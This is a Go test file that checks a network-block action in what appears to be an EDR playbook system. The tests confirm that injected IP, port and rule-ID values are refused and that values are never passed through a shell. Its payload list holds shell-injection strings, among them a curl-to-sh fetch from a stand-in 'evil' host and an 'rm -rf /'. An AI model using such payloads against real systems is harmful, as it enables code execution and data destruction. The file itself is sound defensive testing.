package actions

import (
	"context"
	"strings"
	"testing"
)

// The values in this action come from event data a playbook substituted
// verbatim — {{detection.event.dst_ip}} and friends — so they are
// attacker-influenced. They used to be formatted into a line run by `sh -c`.
func TestInjectionPayloadsAreRefusedNotEscaped(t *testing.T) {
	payloads := []string{
		"1.2.3.4; touch /tmp/pwned",
		"1.2.3.4 && curl http://evil/x | sh",
		"$(id)",
		"`id`",
		"1.2.3.4\nrm -rf /",
		"",
		"not-an-ip",
	}
	for _, p := range payloads {
		a := &NetworkBlockAction{DstIP: p, DstPort: "443", RuleID: "PB-004"}
		if err := a.Validate(); err == nil {
			t.Errorf("DstIP %q was accepted", p)
		}
		// And nothing must be executable even if validation were bypassed.
		for _, arg := range a.applyArgv() {
			if strings.ContainsAny(arg, ";&|`$\n") && arg == p {
				t.Errorf("payload %q survived into an argument", p)
			}
		}
	}
}

func TestPortAndRuleIDAreBounded(t *testing.T) {
	for _, port := range []string{"0", "65536", "-1", "80; id", "", "http"} {
		a := &NetworkBlockAction{DstIP: "1.2.3.4", DstPort: port, RuleID: "PB-004"}
		if err := a.Validate(); err == nil {
			t.Errorf("port %q was accepted", port)
		}
	}
	for _, id := range []string{"a b", "a;b", "a$b", "", strings.Repeat("x", 65)} {
		a := &NetworkBlockAction{DstIP: "1.2.3.4", DstPort: "443", RuleID: id}
		if err := a.Validate(); err == nil {
			t.Errorf("rule id %q was accepted", id)
		}
	}
}

func TestAWellFormedBlockValidatesAndBuildsArgv(t *testing.T) {
	a := &NetworkBlockAction{DstIP: "198.51.100.7", DstPort: "4444", RuleID: "PB-004"}
	if err := a.Validate(); err != nil {
		t.Fatalf("a legitimate block was refused: %v", err)
	}
	argv := a.applyArgv()
	if len(argv) == 0 {
		t.Skip("no implementation on this platform")
	}
	// Each value must occupy its own argument rather than being interpolated
	// into a longer string that a shell would re-split.
	var found bool
	for _, arg := range argv {
		if arg == "198.51.100.7" || arg == "remoteip=198.51.100.7" {
			found = true
		}
	}
	if !found {
		t.Errorf("the address is not a discrete argument: %v", argv)
	}
}

func TestExecuteRefusesBeforeRunningAnything(t *testing.T) {
	a := &NetworkBlockAction{DstIP: "1.2.3.4; touch /tmp/edr-test-pwned", DstPort: "443", RuleID: "PB-004"}
	rb, err := a.Execute(context.Background())
	if err == nil {
		t.Fatal("Execute accepted an injected address")
	}
	if rb != nil {
		t.Error("a refused action returned a rollback")
	}
	if !strings.Contains(err.Error(), "not a valid IP") {
		t.Errorf("err = %v; want it to name the problem", err)
	}
}
